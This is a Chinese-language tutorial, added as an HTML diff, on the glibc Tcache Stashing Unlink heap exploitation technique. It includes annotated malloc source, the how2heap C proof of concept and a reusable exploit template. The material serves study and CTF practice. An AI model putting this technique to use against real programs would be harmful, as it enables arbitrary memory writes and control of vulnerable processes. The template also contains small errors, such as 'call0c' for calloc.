@@ -1,0 +1,188 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>这是一个很有意思的攻击方法，目前即使在glibc2.36都是可以使用的，甚至操作方式都是一样的，我将会从源代码出发，根据how2heap的poc来介绍这种攻击方式，在文章的结尾也会有总结，给出一个模版</p>
+<h2 data-content="1" id="e78f1cd0f6d8e15e9b7cb4800616812a">原理</h2>
+<p>漏洞的源代码如下</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span> <span class="c1">// 获取size对应的small bin索引</span>
+      <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span> <span class="c1">// 获取对应small bin链表头部</span>
+
+      <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
+      <span class="c1">// victim就是要脱链的堆块，也就是small bin里的最后一个</span>
+      <span class="c1">// 这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span>
+        <span class="p">{</span>
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="c1">// 获取victim的bk指针</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="c1">// 对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span>
+    <span class="c1">// 如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span>
+        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">);</span>
+          <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span> <span class="c1">// 设置下一个（高地址）chunk的prev_inuse位</span>
+          <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> <span class="c1">// 将victim脱链</span>
+          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+        <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span> <span class="c1">// 如果不是主arena，设置非主arena标志</span>
+          <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span> <span class="c1">// 检查分配的chunk</span>
+<span class="cp">#if USE_TCACHE</span>
+      <span class="cm">/* 在这里，如果看到其他相同大小的chunk，把它们放入tcache。 */</span>
+      <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span> <span class="c1">// 获取size对应的tcache索引</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span> <span class="c1">// 如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span>
+        <span class="p">{</span>
+          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
+
+          <span class="cm">/* 当bin不为空且tcache未满时，将chunks复制过去。 */</span>
+          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span> <span class="c1">// 如果tcache bin没有满</span>
+             <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span> <span class="c1">// 如果small bin不为空,tc_victim为small bin中的最后一个堆块</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">bck</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="c1">// 这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span>
+              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+            <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">);</span>
+              <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> <span class="c1">// 将tc_victim从small bin中脱链</span>
+              <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span> <span class="c1">// 如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span>
+              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span> <span class="c1">// 将tc_victim链入tc_idx这条链</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="p">}</span>
+<span class="cp">#endif</span>
+          <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span> <span class="c1">// 将chunk转换为用户可用内存</span>
+          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span> <span class="c1">// 对分配的内存进行扰动</span>
+          <span class="k">return</span> <span class="n">p</span><span class="p">;</span> <span class="c1">// 返回分配的内存</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</pre></div>
+<p>大致是说，当我们从small bin拿出来chunk的时候，程序会检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(前提是不能为空，不然即使有空余也不行），就会把剩下的堆块链进tcachebin里面，但是链进去的时候没有进行链表的检查，所以我们可以在这个时候攻击这个即将链进tcachebin的堆块的bk指针，就可以达到任意地址写一个main_arena的效果。</p>
+<p>当然你会发现一个奇怪的事情，明明tcachebin里面不是空的，那不应该先从tcachebin里面取出堆块吗，为什么会直接从smallbin里面取呢</p>
+<p>那就涉及到了这个攻击手法的核心，calloc函数，这个函数最初只是方便同时创建多个大小相同的堆块，但是它在取出堆块的时候，会越过tcachebin，所以想用Tcache Stashing Unlink Attack一定至少可以用一次calloc</p>
+<h2 data-content="1" id="be40d40b108354f6ca4540b4f30083a1">poc</h2>
+<p>我们从how2heap的poc出发，来看看具体怎么进行攻击</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
+
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"这个文件演示了tcache上的stashing unlink攻击。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"这个poc已经在glibc-2.27、glibc-2.29和glibc-2.31上测试过。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"当你能够覆盖victim-&gt;bk指针时，可以使用这个技术。此外，至少需要使用calloc分配一次chunk。最后，我们需要一个可写地址来绕过glibc中的检查。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"在glibc中将smallbin放入tcache的机制给了我们发动攻击的机会。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"这个技术允许我们将libc地址写到我们想要的任何地方，并在我们需要的地方创建一个假的chunk。在这个案例中，我们将在堆栈上创建这个chunk。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// stack_var模拟我们想要分配的fake_chunk</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"stack_var模拟我们想要分配的fake chunk。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"首先，我们将一个可写地址写入fake_chunk-&gt;bk以绕过glibc中的bck-&gt;fd = bin检查。这里我们选择stack_var[2]的地址作为假的bk。稍后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]将在攻击后成为libc地址。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"你可以看到fake_chunk-&gt;bk的值是:%p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"同时，让我们看看stack_var[4]的初始值:%p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"现在我们用malloc分配9个chunks。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">//现在我们分配9个chunks</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//将7个chunks放入tcache</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"然后我们释放其中7个以将它们放入tcache。我们小心地没有按序释放chunk2到chunk9，因为相邻的unsorted bin会在另一个malloc之后合并。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"正如你所见，chunk1和[chunk3,chunk8]被放入tcache bins，而chunk0和chunk2将被放入unsorted bin。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">//最后一个tcache bin</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="c1">//现在它们被放入unsorted bin</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+    <span class="c1">//转换为small bin</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"现在我们分配一个大于0x90的chunk以将chunk0和chunk2放入small bin。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span><span class="c1">// size &gt; 0x90</span>
+
+    <span class="c1">//现在5个tcache bins</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"然后我们分配两个chunk以腾出small bins的空间。之后，我们现在有5个tcache bins和2个small bins。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"现在我们模拟一个可以覆盖victim-&gt;bk指针到fake_chunk地址: %p的漏洞。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">);</span>
+
+    <span class="c1">//更改victim-&gt;bck</span>
+    <span class="cm">/*VULNERABILITY*/</span>
+    <span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">stack_var</span><span class="p">;</span>
+    <span class="cm">/*VULNERABILITY*/</span>
+
+    <span class="c1">//触发攻击</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"最后我们用calloc分配一个0x90的chunk以触发攻击。之前释放的小bin将返回给用户，另一个和fake_chunk被链接到tcache bins。</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x90</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"现在我们的fake chunk已经被放入tcache bin[0xa0]列表。它的fd指针现在指向下一个空闲chunk: %p，而bck-&gt;fd已经被更改为一个libc地址: %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">],(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+
+    <span class="c1">//分配并返回我们的fake chunk在堆栈上</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>   
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"正如你所见，下一次malloc(0x90)将返回我们的fake chunk区域: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>这是poc的源代码</p>
+<p>我们来跟着过一下，看看什么操作</p>
+<p>我们先不管前面的一些操作（其中涉及的保护，后面会说），直接从申请堆块开始看起，首先申请了9个堆块，大小均为0x90</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240801141821-d9d4da86-4fcd-1.png"/></p>
+<p>然后我们选择其中的7个，把它释放进tcachebin bin里面，要注意的是，我们不能按从第一个一直到最后一个的顺序释放，因为我们在填满tcachebins的时候，堆块再被free就会放进unsorted bin，而在unsor bin里面的堆块在释放的时候会检查相邻堆块是不是free状态，如果是，那会进行合并。</p>
+<p>我们先释放后面六个堆块，这时候他们都在0xa0的tcachebins里面，再释放第二个堆块，这样有七个堆块在tcachebins里面，把它填满，同时，没有被free的堆块1和3也会被2隔开，那我们free他们之后也不会合并</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240801142056-366e14b0-4fce-1.png"/></p>
+<p>可以看到，我们完成了布局，只要再申请一个大堆块，大于unsortedbin里面的，就可以把这两个堆块放进smallbin里面。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240801142112-3fe56610-4fce-1.png"/></p>
+<p>上面说到，我们必须让tcachebins链上有空位，那我们现在就要去申请两个堆块，程序会从tcachebins里面取出，也就是说，现在tcachebins里面五个堆块，而smallbin里面两个堆块</p>
+<p>我们想要在stack_var处伪造堆块，这个地方的地址在0x7fffffffdc80</p>
+<p>现在我们可以假设我们有一个漏洞，可以修改smallbin里面堆块的bk指针，要注意我们这里修改的是第三个堆块，也就是末尾位0x3d0的这个堆块，我们把它的fd改成我们想要伪造堆块的位置，也就是把bk改为0x7fffffffdc80</p>
+<p>最后，我们使用calloc函数，申请一个一样大小的smallbin堆块</p>
+<p>理论上来说，我们就完成了攻击，但是实际情况是，我们伪造堆块程序会有保护</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>这个检查是指glibc中的一个安全检查机制，用于确保small bin的双向链表的完整性。具体来说，victim-&gt;bk是small bin中一个chunk的后向指针，bck-&gt;fd是该后向指针指向的前向指针。检查的目的是确保双向链表中的前向指针和后向指针相互匹配，以防止内存破坏或攻击</p>
+<p>这里的bck是victim（即要移除的chunk）的后向指针，bck-&gt;fd是bck指向的前向指针。这个检查确保了bck-&gt;fd指向的是victim，即链表的前向指针和后向指针匹配。如果这个检查不通过，说明链表已经被破坏，程序将报错并终止</p>
+<p>可以通过覆盖victim-&gt;bk指针，使得bck-&gt;fd不再指向victim，从而绕过这个检查，实现任意内存写入</p>
+<p>所以简单来说，我们需要向fake_chunk加0x18的位置，写上一个可读写的地址，具体是什么并不重要，poc里面写的是fake_chunk+0x10的地址</p>
+<p>现在我们的fake chunk已经被放入tcache bin[0xa0]列表。它的fd指针现在指向下一个空闲chunk: 0x5552aaaa6c1d，而bck-&gt;fd已经被更改为一个libc地址: 0x7ffff7e1ad70（也就是fake_chunk+0x20的位置）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240801141920-fce68e0c-4fcd-1.png"/></p>
+<p>这时候就完成了我们的攻击</p>
+<p>再申请0x90大小，正如你所见，下一次malloc(0x90)将返回我们的fake chunk区域: 0x7fffffffdc90（其实是我们的fake_chunk+0x10的位置）</p>
+<h2 data-content="1" id="8ef04db8c029dff23327a52201d0ecbb">总结</h2>
+<div class="highlight"><pre><span></span><span class="c1">#我们假设最后的堆块地址是target，那我们最终是向target+0x8（也就是fd指针）写入main_arena的地址</span>
+<span class="c1">#绕过保护，target+0x8的地方改为一个可读写地址</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span><span class="c1">#0,1,2,3...</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="c1">#完成布局</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#修改bk为target-0x10</span>
+<span class="n">call0c</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="c1">#触发攻击</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="c1">#这个就是伪造的堆块</span>
+</pre></div>
+</div>
+</div>
